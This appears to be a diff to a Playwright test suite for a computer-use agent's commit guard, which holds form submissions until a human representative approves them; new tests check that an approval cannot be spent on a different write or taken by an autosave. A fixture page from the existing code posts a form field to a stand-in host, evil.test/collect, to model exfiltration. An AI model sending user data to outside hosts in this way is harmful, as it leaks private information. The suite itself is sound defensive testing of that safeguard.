@@ -38,6 +38,12 @@ const OFFSITE_PAGE = `<!doctype html><body style="margin:0;font-family:system-ui
   <a href="http://evil.test/verify" style="display:block;padding:20px">Partner check</a>
   <button style="margin:20px" onclick="fetch('http://evil.test/collect', { method: 'POST', body: tin.value })">Verify partner</button></body>`;
 
+// Filled, but the control that submits is a plain span the harness cannot identify; another button writes.
+const UNBOUND_PAGE = `<!doctype html><body style="margin:0;font-family:system-ui">
+  <div style="padding:20px"><label for=c>Company name</label> <input id=c value="Sabiá Foods Ltda"></div>
+  <button style="margin:20px" onclick="fetch('/api/contacts/remove', { method: 'POST', body: '{}' })">Remove contact</button>
+  <span tabindex=0 style="margin:20px;padding:8px" onclick="fetch('/api/register', { method: 'POST', body: '{}' })">Send it</span></body>`;
+
 let browser: Browser;
 let context: BrowserContext;
 let page: Page;
@@ -57,6 +63,7 @@ beforeEach(async () => {
     "/next": "<!doctype html><h1>Next page</h1>",
     "/leave": LEAVE_PAGE,
     "/offsite": OFFSITE_PAGE,
+    "/unbound": UNBOUND_PAGE,
   }));
 });
 // One context per test, closed after it: 18 contexts left open in one Chromium add up under a loaded suite.
@@ -70,7 +77,7 @@ const notes = (replies: CuReply[]) =>
   replies.map((r) => (r.kind === "computer_output" ? (r.note ?? "") : "")).filter(Boolean);
 
 describe("runComputerUse: commit guard", () => {
-  it("voids an unused approval when the page navigates away: it cannot release a later submit", async () => {
+  it("an approval asked on a page with no submit control cannot release a later submit elsewhere", async () => {
     await page.goto(`${FIXTURE_ORIGIN}/leave`);
     const model = createScriptedModel(
       [
@@ -84,7 +91,7 @@ describe("runComputerUse: commit guard", () => {
     );
     const hooks = recordingHooks("approved");
     const r = await runComputerUse(model, cuInput(page), hooks, CTX);
-    expect(hooks.commits).toHaveLength(1);
+    expect(hooks.commits).toHaveLength(0); // nothing to bind on /leave, so the rep is not asked
     const submit = r.trace.steps.find(
       (s) => s.action.type === "click" && s.target?.fingerprint.name === "Submit registration",
     );
@@ -735,6 +742,48 @@ describe("runComputerUse: the approved click", () => {
     expect(out?.kind === "function_output" && out.output).toMatch(
       /^approved and submitted: Dockhand clicked "Submit registration"/,
     );
+  });
+
+  it("asks no approval and grants no token when no submit control can be bound", async () => {
+    await page.goto(`${FIXTURE_ORIGIN}/unbound`);
+    const model = createScriptedModel(
+      [
+        { do: "call", name: "request_commit", args: { summary: "Register Sabiá Foods" } },
+        { do: "click", target: { role: "button", name: "Remove contact" } },
+        { do: "done", text: "ok" },
+      ],
+      page,
+    );
+    const hooks = recordingHooks("approved");
+    const r = await runComputerUse(model, cuInput(page), hooks, CTX);
+    expect(hooks.commits).toHaveLength(0);
+    expect(posts()).toHaveLength(0); // the approval could not be spent on another write
+    const out = model.replies.find((x) => x.kind === "function_output");
+    expect(out?.kind === "function_output" && out.output).toMatch(/^not submitted: no control that submits/);
+    expect(r.trace.steps.find((s) => s.action.type === "click")?.tags).toContain("blocked");
+  });
+
+  it("grants the write token only after the approved button is checked: an autosave cannot take it", async () => {
+    await page.goto(`${FIXTURE_ORIGIN}/form`);
+    const model = createScriptedModel(
+      [
+        { do: "fill", target: { label: "Company name" }, text: "Sabiá Foods Ltda" },
+        { do: "call", name: "request_commit", args: { summary: "Register Sabiá Foods Ltda" } },
+        { do: "done", text: "Submitted." },
+      ],
+      page,
+    );
+    const hooks = recordingHooks("approved");
+    const approve = hooks.approveCommit;
+    hooks.approveCommit = async (req) => {
+      // The page autosaves right as the rep taps Approve.
+      await page.evaluate(() => {
+        setTimeout(() => void fetch("/api/autosave", { method: "POST", body: "{}" }).catch(() => {}), 0);
+      });
+      return approve(req);
+    };
+    await runComputerUse(model, cuInput(page), hooks, CTX);
+    expect(posts().map((h) => new URL(h.url).pathname)).toEqual(["/api/register"]);
   });
 
   it("voids the approval when the approved button is gone by the time the rep approves", async () => {
